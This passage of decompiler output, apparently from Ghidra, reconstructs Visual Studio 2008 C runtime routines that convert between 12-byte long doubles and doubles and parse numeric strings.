      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar7 = (byte)(0x1f - uVar13);
      pp_Var9 = local_24 + iVar14;
      local_14 = 0x1f - uVar13;
      if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
        p_Var2 = (_LDBL12 *)((uint)local_24[iVar14] & ~(-1 << (bVar7 & 0x1f)));
        while (p_Var2 == (_LDBL12 *)0x0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_00426075;
          p_Var2 = local_24[iVar14];
        }
        iVar14 = (int)(iVar4 + (iVar4 >> 0x1f & 0x1fU)) >> 5;
        bVar16 = false;
        p_Var12 = (_LDBL12 *)(1 << (0x1f - ((byte)iVar4 & 0x1f) & 0x1f));
        p_Var2 = local_24[iVar14];
        puVar1 = p_Var12->ld12 + (int)p_Var2->ld12;
        if ((puVar1 < p_Var2) || (puVar1 < p_Var12)) {
          bVar16 = true;
        }
        local_24[iVar14] = (_LDBL12 *)puVar1;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar16))) {
          p_Var2 = local_24[iVar14];
          puVar1 = p_Var2->ld12 + 1;
          bVar16 = false;
          if ((puVar1 < p_Var2) || (puVar1 == (uchar *)0x0)) {
            bVar16 = true;
          }
          local_24[iVar14] = (_LDBL12 *)puVar1;
        }
      }
LAB_00426075:
      *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_14 & 0x1f));
      iVar14 = local_10 + 1;
      if (iVar14 < 3) {
        pp_Var9 = local_24 + iVar14;
        for (iVar4 = 3 - iVar14; iVar4 != 0; iVar4 = iVar4 + -1) {
          *pp_Var9 = (_LDBL12 *)0x0;
          pp_Var9 = pp_Var9 + 1;
        }
      }
      uVar13 = DAT_00433c9c + 1;
      iVar14 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
    }
    iVar14 = 0;
    IVar5 = INTRNCVT_UNDERFLOW;
  }
LAB_00426289:
  uVar13 = iVar14 << (0x1fU - (char)DAT_00433c9c & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24[0];
  if (DAT_00433ca0 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar13;
    *(_LDBL12 **)&_D->x = local_24[1];
  }
  else if (DAT_00433ca0 == 0x20) {
    *(uint *)&_D->x = uVar13;
  }
  return IVar5;
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2008 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  uchar *puVar1;
  _LDBL12 *p_Var2;
  undefined4 uVar3;
  int iVar4;
  INTRNCVT_STATUS IVar5;
  int iVar6;
  byte bVar7;
  _LDBL12 **pp_Var8;
  _LDBL12 **pp_Var9;
  uint uVar10;
  undefined *puVar11;
  _LDBL12 *p_Var12;
  uint uVar13;
  int iVar14;
  int iVar15;
  bool bVar16;
  _LDBL12 *local_24 [2];
  int local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  _LDBL12 *local_8;
  
  local_18 = *(ushort *)(_Ifp->ld12 + 10) & 0x8000;
  p_Var2 = *(_LDBL12 **)(_Ifp->ld12 + 6);
  local_24[0] = p_Var2;
  uVar3 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar13 = *(ushort *)(_Ifp->ld12 + 10) & 0x7fff;
  iVar14 = uVar13 - 0x3fff;
  iVar4 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_24[1] = (_LDBL12 *)uVar3;
  local_1c = iVar4;
  if (iVar14 == -0x3fff) {
    iVar14 = 0;
    iVar4 = 0;
    do {
      if (local_24[iVar4] != (_LDBL12 *)0x0) {
        local_24[0] = (_LDBL12 *)0x0;
        local_24[1] = (_LDBL12 *)0x0;
        IVar5 = INTRNCVT_UNDERFLOW;
        goto LAB_004267cd;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    IVar5 = INTRNCVT_OK;
  }
  else {
    _Ifp = (_LDBL12 *)0x0;
    iVar15 = DAT_00433cb0 - 1;
    iVar6 = (int)(DAT_00433cb0 + ((int)DAT_00433cb0 >> 0x1f & 0x1fU)) >> 5;
    uVar10 = DAT_00433cb0 & 0x8000001f;
    local_14 = iVar14;
    local_10 = iVar6;
    if ((int)uVar10 < 0) {
      uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;
    }
    pp_Var9 = local_24 + iVar6;
    bVar7 = (byte)(0x1f - uVar10);
    local_c = 0x1f - uVar10;
    if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
      p_Var12 = (_LDBL12 *)((uint)local_24[iVar6] & ~(-1 << (bVar7 & 0x1f)));
      while( true ) {
        if (p_Var12 != (_LDBL12 *)0x0) {
          iVar6 = (int)(iVar15 + (iVar15 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (_LDBL12 *)0x0;
          puVar11 = (undefined *)(1 << (0x1f - ((byte)iVar15 & 0x1f) & 0x1f));
          pp_Var8 = local_24 + iVar6;
          _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + (int)puVar11);
          if (_Ifp < *pp_Var8) goto LAB_00426401;
          bVar16 = _Ifp < puVar11;
          do {
            local_8 = (_LDBL12 *)0x0;
            if (!bVar16) goto LAB_00426408;
LAB_00426401:
            do {
              local_8 = (_LDBL12 *)0x1;
LAB_00426408:
              iVar6 = iVar6 + -1;
              *pp_Var8 = _Ifp;
              if ((iVar6 < 0) || (local_8 == (_LDBL12 *)0x0)) {
                _Ifp = local_8;
                goto LAB_00426416;
              }
              local_8 = (_LDBL12 *)0x0;
              pp_Var8 = local_24 + iVar6;
              _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + 1);
            } while (_Ifp < *pp_Var8);
            bVar16 = _Ifp == (_LDBL12 *)0x0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        p_Var12 = local_24[iVar6];
      }
    }
LAB_00426416:
    *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_c & 0x1f));
    iVar6 = local_10 + 1;
    if (iVar6 < 3) {
      pp_Var9 = local_24 + iVar6;
      for (iVar15 = 3 - iVar6; iVar15 != 0; iVar15 = iVar15 + -1) {
        *pp_Var9 = (_LDBL12 *)0x0;
        pp_Var9 = pp_Var9 + 1;
      }
    }
    if (_Ifp != (_LDBL12 *)0x0) {
      iVar14 = uVar13 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_00433cac - DAT_00433cb0)) {
      local_24[0] = (_LDBL12 *)0x0;
      local_24[1] = (_LDBL12 *)0x0;
    }
    else {
      if (DAT_00433cac < iVar14) {
        if (iVar14 < DAT_00433ca8) {
          local_24[0] = (_LDBL12 *)((uint)local_24[0] & 0x7fffffff);
          iVar14 = iVar14 + DAT_00433cbc;
          iVar4 = (int)(DAT_00433cb4 + ((int)DAT_00433cb4 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_00433cb4 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            local_14 = (uint)local_24[(int)_Ifp] & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] =
                 (_LDBL12 *)((uint)local_24[(int)_Ifp] >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar6 = 2;
          pp_Var9 = local_24 + (2 - iVar4);
          do {
            if (iVar6 < iVar4) {
              local_24[iVar6] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar6] = *pp_Var9;
            }
            iVar6 = iVar6 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar6);
          IVar5 = INTRNCVT_OK;
        }
        else {
          local_24[1] = (_LDBL12 *)0x0;
          local_1c = 0;
          local_24[0] = (_LDBL12 *)0x80000000;
          iVar14 = (int)(DAT_00433cb4 + ((int)DAT_00433cb4 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_00433cb4 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          _Ifp = (_LDBL12 *)0x0;
          local_8 = (_LDBL12 *)(0x20 - uVar13);
          do {
            p_Var2 = local_24[(int)_Ifp];
            local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
            local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
            _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)_Ifp < 3);
          iVar4 = 2;
          pp_Var9 = local_24 + (2 - iVar14);
          do {
            if (iVar4 < iVar14) {
              local_24[iVar4] = (_LDBL12 *)0x0;
            }
            else {
              local_24[iVar4] = *pp_Var9;
            }
            iVar4 = iVar4 + -1;
            pp_Var9 = pp_Var9 + -1;
          } while (-1 < iVar4);
          iVar14 = DAT_00433cbc + DAT_00433ca8;
          IVar5 = INTRNCVT_OVERFLOW;
        }
        goto LAB_004267cd;
      }
      local_14 = DAT_00433cac - local_14;
      local_24[0] = p_Var2;
      local_24[1] = (_LDBL12 *)uVar3;
      iVar14 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
      iVar4 = DAT_00433cb0 - 1;
      iVar14 = (int)(DAT_00433cb0 + ((int)DAT_00433cb0 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_00433cb0 & 0x8000001f;
      local_10 = iVar14;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar7 = (byte)(0x1f - uVar13);
      pp_Var9 = local_24 + iVar14;
      local_14 = 0x1f - uVar13;
      if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
        p_Var2 = (_LDBL12 *)((uint)local_24[iVar14] & ~(-1 << (bVar7 & 0x1f)));
        while (p_Var2 == (_LDBL12 *)0x0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_004265b9;
          p_Var2 = local_24[iVar14];
        }
        iVar14 = (int)(iVar4 + (iVar4 >> 0x1f & 0x1fU)) >> 5;
        bVar16 = false;
        p_Var12 = (_LDBL12 *)(1 << (0x1f - ((byte)iVar4 & 0x1f) & 0x1f));
        p_Var2 = local_24[iVar14];
        puVar1 = p_Var12->ld12 + (int)p_Var2->ld12;
        if ((puVar1 < p_Var2) || (puVar1 < p_Var12)) {
          bVar16 = true;
        }
        local_24[iVar14] = (_LDBL12 *)puVar1;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar16))) {
          p_Var2 = local_24[iVar14];
          puVar1 = p_Var2->ld12 + 1;
          bVar16 = false;
          if ((puVar1 < p_Var2) || (puVar1 == (uchar *)0x0)) {
            bVar16 = true;
          }
          local_24[iVar14] = (_LDBL12 *)puVar1;
        }
      }
LAB_004265b9:
      *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_14 & 0x1f));
      iVar14 = local_10 + 1;
      if (iVar14 < 3) {
        pp_Var9 = local_24 + iVar14;
        for (iVar4 = 3 - iVar14; iVar4 != 0; iVar4 = iVar4 + -1) {
          *pp_Var9 = (_LDBL12 *)0x0;
          pp_Var9 = pp_Var9 + 1;
        }
      }
      uVar13 = DAT_00433cb4 + 1;
      iVar14 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
    }
    iVar14 = 0;
    IVar5 = INTRNCVT_UNDERFLOW;
  }
LAB_004267cd:
  uVar13 = iVar14 << (0x1fU - (char)DAT_00433cb4 & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24[0];
  if (DAT_00433cb8 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar13;
    *(_LDBL12 **)&_D->x = local_24[1];
  }
  else if (DAT_00433cb8 == 0x20) {
    *(uint *)&_D->x = uVar13;
  }
  return IVar5;
}



// Library Function - Single Match
//  ___strgtold12_l
// 
// Library: Visual Studio 2008 Release

uint __cdecl
___strgtold12_l(_LDBL12 *pld12,char **p_end_ptr,char *str,int mult12,int scale,int decpt,
               int implicit_E,_locale_t _Locale)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  bool bVar4;
  bool bVar5;
  bool bVar6;
  ushort uVar7;
  char cVar8;
  int *piVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  ushort uVar14;
  int iVar15;
  undefined *puVar16;
  ushort uVar17;
  char *pcVar18;
  undefined4 uVar19;
  ushort uVar20;
  undefined4 uVar21;
  char *pcVar22;
  short *psVar23;
  int local_6c;
  int local_68;
  int *local_64;
  ushort *local_60;
  int local_5c;
  char *local_58;
  int local_54;
  uint local_50;
  undefined2 local_4c;
  undefined4 uStack_4a;
  undefined2 uStack_46;
  int local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 uStack_38;
  byte local_30;
  undefined uStack_2f;
  undefined4 uStack_2e;
  undefined4 uStack_2a;
  ushort uStack_26;
  char local_24 [23];
  char local_d;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  iVar15 = 0;
  pcVar22 = local_24;
  uVar7 = 0;
  local_6c = 1;
  local_50 = 0;
  bVar4 = false;
  bVar6 = false;
  bVar5 = false;
  local_68 = 0;
  local_54 = 0;
  if (_Locale != (_locale_t)0x0) {
    local_58 = str;
    for (; (((cVar8 = *str, cVar8 == ' ' || (cVar8 == '\t')) || (cVar8 == '\n')) || (cVar8 == '\r'))
        ; str = str + 1) {
    }
LAB_00426897:
    cVar8 = *str;
    pcVar18 = str + 1;
    switch(iVar15) {
    case 0:
      if ((byte)(cVar8 - 0x31U) < 9) {
LAB_004268b4:
        iVar15 = 3;
        goto LAB_004268b6;
      }
      if (cVar8 == **(char **)_Locale->locinfo[1].lc_codepage) {
LAB_004268cb:
        iVar15 = 5;
        str = pcVar18;
      }
      else if (cVar8 == '+') {
        uVar7 = 0;
        iVar15 = 2;
        str = pcVar18;
      }
      else {
        if (cVar8 != '-') {
          if (cVar8 == '0') goto LAB_004268e5;
          goto LAB_00426a70;
        }
        iVar15 = 2;
        uVar7 = 0x8000;
        str = pcVar18;
      }
      goto LAB_00426897;
    case 1:
      bVar4 = true;
      if ((byte)(cVar8 - 0x31U) < 9) goto LAB_004268b4;
      if (cVar8 == **(char **)_Locale->locinfo[1].lc_codepage) goto LAB_0042691c;
      if ((cVar8 == '+') || (cVar8 == '-')) goto LAB_0042694c;
      if (cVar8 == '0') goto LAB_004268e5;
      goto LAB_0042692c;
    case 2:
      if ((byte)(cVar8 - 0x31U) < 9) goto LAB_004268b4;
      if (cVar8 == **(char **)_Locale->locinfo[1].lc_codepage) goto LAB_004268cb;
      str = local_58;
      if (cVar8 != '0') goto LAB_00426a9b;
LAB_004268e5:
      iVar15 = 1;
      str = pcVar18;
      goto LAB_00426897;
    case 3:
      while (('/' < cVar8 && (cVar8 < ':'))) {
        if (local_50 < 0x19) {
          local_50 = local_50 + 1;
          *pcVar22 = cVar8 + -0x30;
          pcVar22 = pcVar22 + 1;
        }
        else {
          local_54 = local_54 + 1;
        }
        cVar8 = *pcVar18;
        pcVar18 = pcVar18 + 1;
      }
      if (cVar8 != **(char **)_Locale->locinfo[1].lc_codepage) goto LAB_004269bf;
LAB_0042691c:
      bVar4 = true;
      iVar15 = 4;
      str = pcVar18;
      goto LAB_00426897;
    case 4:
      bVar6 = true;
      if (local_50 == 0) {
        while (cVar8 == '0') {
          local_54 = local_54 + -1;
          cVar8 = *pcVar18;
          pcVar18 = pcVar18 + 1;
        }
      }
      while (('/' < cVar8 && (cVar8 < ':'))) {
        if (local_50 < 0x19) {
          local_50 = local_50 + 1;
          *pcVar22 = cVar8 + -0x30;
          pcVar22 = pcVar22 + 1;
          local_54 = local_54 + -1;
        }
        cVar8 = *pcVar18;
        pcVar18 = pcVar18 + 1;
      }
LAB_004269bf:
      if ((cVar8 == '+') || (cVar8 == '-')) {
LAB_0042694c:
        bVar4 = true;
        iVar15 = 0xb;
        str = pcVar18 + -1;
      }
      else {
LAB_0042692c:
        bVar4 = true;
        if ((cVar8 < 'D') || (('E' < cVar8 && ((cVar8 < 'd' || ('e' < cVar8)))))) goto LAB_00426a70;
        iVar15 = 6;
        str = pcVar18;
      }
      goto LAB_00426897;
    case 5:
      bVar6 = true;
      str = local_58;
      if ((byte)(cVar8 - 0x30U) < 10) {
        iVar15 = 4;
        goto LAB_004268b6;
      }
      goto LAB_00426a9b;
    case 6:
      local_58 = str + -1;
      if (8 < (byte)(cVar8 - 0x31U)) {
        if (cVar8 == '+') goto LAB_00426a57;
        if (cVar8 == '-') goto LAB_00426a4b;
LAB_00426a3e:
        str = local_58;
        if (cVar8 != '0') goto LAB_00426a9b;
        iVar15 = 8;
        str = pcVar18;
        goto LAB_00426897;
      }
      break;
    case 7:
      if (8 < (byte)(cVar8 - 0x31U)) goto LAB_00426a3e;
      break;
    case 8:
      bVar5 = true;
      while (cVar8 == '0') {
        cVar8 = *pcVar18;
        pcVar18 = pcVar18 + 1;
      }
      if (8 < (byte)(cVar8 - 0x31U)) goto LAB_00426a70;
      break;
    case 9:
      bVar5 = true;
      local_68 = 0;
      goto LAB_00426afd;
    default:
      goto switchD_004268a3_caseD_a;
    case 0xb:
      if (implicit_E != 0) {
        local_58 = str;
        if (cVar8 == '+') {
LAB_00426a57:
          iVar15 = 7;
          str = pcVar18;
        }
        else {
          if (cVar8 != '-') goto LAB_00426a9b;
LAB_00426a4b:
          local_6c = -1;
          iVar15 = 7;
          str = pcVar18;
        }
        goto LAB_00426897;
      }
      iVar15 = 10;
      pcVar18 = str;
switchD_004268a3_caseD_a:
      str = pcVar18;
      if (iVar15 != 10) goto LAB_00426897;
      goto LAB_00426a9b;
    }
    iVar15 = 9;
LAB_004268b6:
    str = pcVar18 + -1;
    goto LAB_00426897;
  }
  piVar9 = __errno();
  *piVar9 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  uVar3 = CONCAT22(local_40._2_2_,(undefined2)local_40);
  uVar12 = CONCAT22(uStack_38._2_2_,(ushort)uStack_38);
  goto LAB_00426ec8;
LAB_00426afd:
  if ((cVar8 < '0') || ('9' < cVar8)) goto LAB_00426b18;
  local_68 = local_68 * 10 + -0x30 + (int)cVar8;
  if (local_68 < 0x1451) {
    cVar8 = *pcVar18;
    pcVar18 = pcVar18 + 1;
    goto LAB_00426afd;
  }
  local_68 = 0x1451;
LAB_00426b18:
  while (('/' < cVar8 && (cVar8 < ':'))) {
    cVar8 = *pcVar18;
    pcVar18 = pcVar18 + 1;
  }
LAB_00426a70:
  str = pcVar18 + -1;
LAB_00426a9b:
  *p_end_ptr = str;
  if (bVar4) {
    if (0x18 < local_50) {
      if ('\x04' < local_d) {
        local_d = local_d + '\x01';
      }
      pcVar22 = pcVar22 + -1;
      local_54 = local_54 + 1;
      local_50 = 0x18;
    }
    if (local_50 == 0) goto LAB_00426eaa;
    while (pcVar22 = pcVar22 + -1, *pcVar22 == '\0') {
      local_50 = local_50 - 1;
      local_54 = local_54 + 1;
    }
    ___mtold12(local_24,local_50,&local_40);
    iVar2 = CONCAT22(local_3c._2_2_,(undefined2)local_3c);
    uVar3 = CONCAT22(local_40._2_2_,(undefined2)local_40);
    iVar1 = CONCAT22(uStack_2a._2_2_,(ushort)uStack_2a);
    uVar13 = CONCAT22(uStack_2e._2_2_,(ushort)uStack_2e);
    uVar12 = CONCAT22(uStack_38._2_2_,(ushort)uStack_38);
    uVar11 = CONCAT22(uStack_38._2_2_,(ushort)uStack_38);
    iVar15 = CONCAT22(uStack_4a._2_2_,(undefined2)uStack_4a);
    if (local_6c < 0) {
      local_68 = -local_68;
    }
    local_58 = (char *)(local_68 + local_54);
    if (!bVar5) {
      local_58 = (char *)((int)local_58 + scale);
    }
    if (!bVar6) {
      local_58 = (char *)((int)local_58 - decpt);
    }
    if ((int)local_58 < 0x1451) {
      if ((int)local_58 < -0x1450) goto LAB_00426eaa;
      puVar16 = &DAT_00433c60;
      if (local_58 != (char *)0x0) {
        if ((int)local_58 < 0) {
          local_58 = (char *)-(int)local_58;
          puVar16 = &DAT_00433dc0;
        }
        if (mult12 == 0) {
          local_40._0_2_ = 0;
        }
        iVar15 = uStack_4a;
        uVar11 = uVar12;
        uVar13 = uStack_2e;
        iVar1 = uStack_2a;
        uVar3 = CONCAT22(local_40._2_2_,(undefined2)local_40);
        iVar2 = local_3c;
joined_r0x00426ba5:
        if (local_58 != (char *)0x0) {
          uStack_38._2_2_ = (ushort)(uVar11 >> 0x10);
          uVar12 = (int)local_58 >> 3;
          puVar16 = puVar16 + 0x54;
          uVar10 = (uint)local_58 & 7;
          local_58 = (char *)uVar12;
          if (uVar10 != 0) {
            piVar9 = (int *)(puVar16 + uVar10 * 0xc);
            if (0x7fff < *(ushort *)piVar9) {
              local_4c = (undefined2)*piVar9;
              uStack_4a._0_2_ = (undefined2)((uint)*piVar9 >> 0x10);
              uStack_4a._2_2_ = (undefined2)piVar9[1];
              uStack_46 = (undefined2)((uint)piVar9[1] >> 0x10);
              local_44 = piVar9[2];
              iVar15 = CONCAT22(uStack_4a._2_2_,(undefined2)uStack_4a) + -1;
              uStack_4a._0_2_ = (undefined2)iVar15;
              uStack_4a._2_2_ = (undefined2)((uint)iVar15 >> 0x10);
              piVar9 = (int *)&local_4c;
            }
            local_54 = 0;
            local_30 = 0;
            uStack_2f = 0;
            uStack_2e._0_2_ = 0;
            uStack_2e._2_2_ = 0;
            uVar13 = 0;
            uStack_2a._0_2_ = 0;
            uStack_2a._2_2_ = 0;
            iVar1 = 0;
            uStack_26 = 0;
            uVar14 = *(ushort *)((int)piVar9 + 10) & 0x7fff;
            uVar20 = (*(ushort *)((int)piVar9 + 10) ^ uStack_38._2_2_) & 0x8000;
            uVar17 = uVar14 + (uStack_38._2_2_ & 0x7fff);
            if ((((uStack_38._2_2_ & 0x7fff) < 0x7fff) && (uVar14 < 0x7fff)) && (uVar17 < 0xbffe)) {
              if (0x3fbf < uVar17) {
                if ((((uVar11 & 0x7fff0000) == 0) &&
                    (uVar17 = uVar17 + 1, (uVar11 & 0x7fffffff) == 0)) &&
                   ((iVar2 == 0 && (uVar3 == 0)))) {
                  uStack_38._2_2_ = 0;
                  uVar11 = uVar11 & 0xffff;
                  uVar13 = 0;
                  iVar1 = 0;
                }
                else if (((uVar14 == 0) && (uVar17 = uVar17 + 1, (piVar9[2] & 0x7fffffffU) == 0)) &&
                        ((piVar9[1] == 0 && (*piVar9 == 0)))) {
                  uStack_38._0_2_ = 0;
                  uStack_38._2_2_ = 0;
                  uVar11 = 0;
                  local_3c._0_2_ = 0;
                  local_3c._2_2_ = 0;
                  local_40._0_2_ = 0;
                  local_40._2_2_ = 0;
                  uVar3 = 0;
                  iVar2 = 0;
                }
                else {
                  local_6c = 0;
                  psVar23 = (short *)((int)&uStack_2e + 2);
                  local_5c = 5;
                  do {
                    local_68 = local_5c;
                    if (0 < local_5c) {
                      local_60 = (ushort *)((int)&local_40 + local_6c * 2);
                      local_64 = piVar9 + 2;
                      do {
                        bVar4 = false;
                        uVar13 = *(uint *)(psVar23 + -2) +
                                 (uint)*(ushort *)local_64 * (uint)*local_60;
                        if ((uVar13 < *(uint *)(psVar23 + -2)) ||
                           (uVar13 < (uint)*(ushort *)local_64 * (uint)*local_60)) {
                          bVar4 = true;
                        }
                        *(uint *)(psVar23 + -2) = uVar13;
                        if (bVar4) {
                          *psVar23 = *psVar23 + 1;
                        }
                        local_60 = local_60 + 1;
                        local_64 = (int *)((int)local_64 + -2);
                        local_68 = local_68 + -1;
                      } while (0 < local_68);
                    }
                    psVar23 = psVar23 + 1;
                    local_6c = local_6c + 1;
                    local_5c = local_5c + -1;
                  } while (0 < local_5c);
                  uVar17 = uVar17 + 0xc002;
                  if ((short)uVar17 < 1) {
LAB_00426d60:
                    uVar17 = uVar17 - 1;
                    if ((short)uVar17 < 0) {
                      uVar13 = (uint)(ushort)-uVar17;
                      uVar17 = 0;
                      do {
                        if ((local_30 & 1) != 0) {
                          local_54 = local_54 + 1;
                        }
                        iVar2 = CONCAT22(uStack_26,uStack_2a._2_2_);
                        uVar11 = CONCAT22((ushort)uStack_2a,uStack_2e._2_2_);
                        iVar1 = CONCAT22((ushort)uStack_2a,uStack_2e._2_2_);
                        uStack_2a._2_2_ = (ushort)(CONCAT22(uStack_26,uStack_2a._2_2_) >> 1);
                        uStack_26 = uStack_26 >> 1;
                        uStack_2a._0_2_ =
                             (ushort)uStack_2a >> 1 | (ushort)((uint)(iVar2 << 0x1f) >> 0x10);
                        uVar12 = CONCAT22((ushort)uStack_2e,CONCAT11(uStack_2f,local_30)) >> 1;
                        uStack_2e._0_2_ =
                             (ushort)uStack_2e >> 1 | (ushort)((uint)(iVar1 << 0x1f) >> 0x10);
                        uVar13 = uVar13 - 1;
                        uStack_2e._2_2_ = (ushort)(uVar11 >> 1);
                        local_30 = (byte)uVar12;
                        uStack_2f = (undefined)(uVar12 >> 8);
                      } while (uVar13 != 0);
                      if (local_54 != 0) {
                        local_30 = local_30 | 1;
                      }
                    }
                  }
                  else {
                    do {
                      uVar14 = (ushort)uStack_2e;
                      if ((short)uStack_26 < 0) break;
                      iVar1 = CONCAT22((ushort)uStack_2e,CONCAT11(uStack_2f,local_30)) << 1;
                      local_30 = (byte)iVar1;
                      uStack_2f = (undefined)((uint)iVar1 >> 8);
                      uStack_2e._0_2_ = (ushort)((uint)iVar1 >> 0x10);
                      iVar1 = CONCAT22((ushort)uStack_2a,uStack_2e._2_2_) * 2;
                      uStack_2e._2_2_ = (ushort)iVar1 | uVar14 >> 0xf;
                      iVar2 = CONCAT22(uStack_26,uStack_2a._2_2_) * 2;
                      uStack_2a._2_2_ = (ushort)iVar2 | (ushort)uStack_2a >> 0xf;
                      uVar17 = uVar17 - 1;
                      uStack_2a._0_2_ = (ushort)((uint)iVar1 >> 0x10);
                      uStack_26 = (ushort)((uint)iVar2 >> 0x10);
                    } while (0 < (short)uVar17);
                    if ((short)uVar17 < 1) goto LAB_00426d60;
                  }
